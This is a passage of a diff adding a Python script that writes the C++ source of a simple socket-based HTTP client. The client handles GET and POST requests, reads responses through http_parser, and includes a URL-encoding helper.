+        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        struct sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(query.port);
+        inet_pton(AF_INET, ips[i].c_str(), &addr.sin_addr);
+
+        if(connect(sockfd,(struct sockaddr *) &addr, sizeof (addr)) != 0) {
+            close(sockfd);
+            continue;
+        }
+
+#ifdef _WIN64
+        u_long nonblock = 1;
+        ioctlsocket(sockfd, FIONBIO, &nonblock);
+#else
+        int flags;
+        flags = fcntl(sockfd,F_GETFL,0);
+        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
+#endif
+
+        string request = query.action + " " + query.path + ((query.query == "") ? "" : ("?" + query.query)) + " HTTP/1.1\\r\\nHost: " + query.host + "\\r\\n";
+        if(query.payload != "") {
+            request += "Content-Type: application/" + content_type + "\\r\\nContent-Length: " + to_string(query.payload.length()) + "\\r\\n\\r\\n" + query.payload + "\\r\\n";
+        }
+        request += "\\r\\n";
+
+        char *buff = (char *)request.c_str();
+        int sz = request.size();
+        int n = 0;
+
+        while(sz > 0) {
+            n = send(sockfd, buff, sz, 0);
+            if(n < 0) break;
+            buff+=n;
+            sz-=n;
+        }
+
+        if(n < 0) {
+            close(sockfd);
+            continue;
+        }
+
+        http_parser_settings settings;
+        memset(&settings, 0, sizeof(settings));
+        settings.on_body = http_callback;
+        settings.on_message_complete = http_complete_callback;
+
+        http_parser parser;
+        http_parser_init(&parser, HTTP_RESPONSE);
+        parser.data = (void *)&reply;
+
+        fd_set fds;
+        timeval tv;
+
+        time_t timestamp = time(NULL);
+        while(time(NULL) - timestamp < 10) {
+            FD_ZERO(&fds);
+            FD_SET(sockfd, &fds);
+
+            tv.tv_sec = 0;
+            tv.tv_usec = 100000;
+
+            n = select(sockfd + 1, &fds, NULL, NULL, &tv);
+            if(n == 0)
+                continue;
+            else if(n < 0)
+                break;
+            else {
+                char buffer[2048];
+                n = recv(sockfd, buffer, 2048, 0);
+                if (n > 0)
+                    http_parser_execute(&parser, &settings, buffer, n);
+                else if(n <= 0)
+                    break;
+
+                if (reply.complete)
+                    break;
+            }
+        }
+
+        close(sockfd);
+
+        if(reply.body != "")
+            break;
+    }
+
+    return reply.body;
+};
+
+string http::_http_get(const string &url) {
+    return __get_response(url, "", "");
+}
+
+string http::_http_post(const string &url, const string &post_data, const string &content_type) {
+    return __get_response(url, post_data, content_type);
+}
+
+string http::_encode(const string &src) {
+    string new_str = "";
+    char c;
+    int ic;
+    const char* chars = src.c_str();
+    char bufHex[10];
+    int len = strlen(chars);
+
+    for(int i=0;i<len;i++){
+        c = chars[i];
+        ic = c;
+        if (c==' ') new_str += '+';
+        else if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') new_str += c;
+        else {
+            sprintf(bufHex,"%X",c);
+            if(ic < 16)
+                new_str += "%0";
+            else
+                new_str += "%";
+            new_str += bufHex;
+        }
+    }
+    return new_str;
+}
+
+"""
+
+open('./http/http.cpp', 'w').write(content)
 
 content="""//
 // Created by Haifa Bogdan Adnan on 05/08/2018.
